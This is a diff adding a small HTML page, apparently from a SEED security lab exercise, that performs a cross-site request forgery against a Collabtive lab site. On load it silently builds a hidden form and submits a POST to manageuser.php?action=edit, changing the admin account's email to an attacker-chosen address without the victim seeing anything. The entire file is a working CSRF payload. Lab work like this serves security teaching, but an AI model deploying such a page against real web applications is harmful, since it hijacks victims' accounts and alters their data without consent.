@@ -1,0 +1,33 @@
+<html><body><h1>
+This page forges an HTTP POST request.
+</h1>
+<script>
+	function post(url,fields)
+	{
+		//create a <form> element.
+		var p = document.createElement('form');
+		//construct the form
+		p.action = url;
+		p.innerHTML = fields;
+		p.target = '_self';
+		p.method = 'post';
+		//append the form to the current page.
+		document.body.appendChild(p);
+		//submit the form
+		p.submit();
+	}
+	function csrf_hack()
+	{
+		var fields;
+		// The following are form entries that need to be filled out
+		// by attackers. The entries are made hidden, so the victim
+		// won’t be able to see them.
+		fields += "<input type='hidden' name='name' value='admin'>";
+		fields += "<input type='hidden' name='email' value='csrfhacked@email.com'>";
+		fields += "<input type='hidden' name='company' value='seed'>";
+		post('http://www.csrflabcollabtive.com/manageuser.php?action=edit',fields);
+	}
+	// invoke csrf_hack() after the page is loaded.
+	window.onload = function() { csrf_hack(); }
+</script>
+</body></html>
